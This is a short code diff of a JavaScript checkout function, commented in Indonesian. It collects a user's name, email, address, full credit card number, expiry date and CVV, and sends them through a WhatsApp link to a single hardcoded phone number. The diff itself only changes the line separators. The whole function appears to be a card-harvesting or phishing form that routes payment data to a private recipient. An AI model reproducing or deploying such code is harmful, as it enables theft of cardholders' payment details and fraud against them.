@@ -16,16 +16,16 @@ function sendWhatsAppMessage() {
     let whatsappUrl = "https://api.whatsapp.com/send?phone=6281908775565&text=";
 
     // Isi pesan
-    let message = "Username: " + username + "%0A";
-    message += "Email: " + email + "%0A";
-    message += "Address: " + address + "%0A";
-    message += "City: " + city + "%0A";
-    message += "State: " + state + "%0A";
-    message += "Zip Code: " + zipcode + "%0A";
-    message += "Name on Card: " + cardname + "%0A";
-    message += "Credit Card Number: " + cardnumber + "%0A";
-    message += "Exp Month: " + expmonth + "%0A";
-    message += "Exp Year: " + expyear + "%0A";
+    let message = "Username: " + username + "<br>";
+    message += "Email: " + email + "<br>";
+    message += "Address: " + address + "<br>";
+    message += "City: " + city + "<br>";
+    message += "State: " + state + "<br>";
+    message += "Zip Code: " + zipcode + "<br>";
+    message += "Name on Card: " + cardname + "<br>";
+    message += "Credit Card Number: " + cardnumber + "<br>";
+    message += "Exp Month: " + expmonth + "<br>";
+    message += "Exp Year: " + expyear + "<br>";
     message += "CVV: " + cvv;
 
     // memastikan karakte khusus terenkripsi dengan benar.
@@ -36,3 +36,4 @@ function sendWhatsAppMessage() {
     //  membuka WhatsApp di jendela baru 
     window.open(whatsappUrl);
 }
+
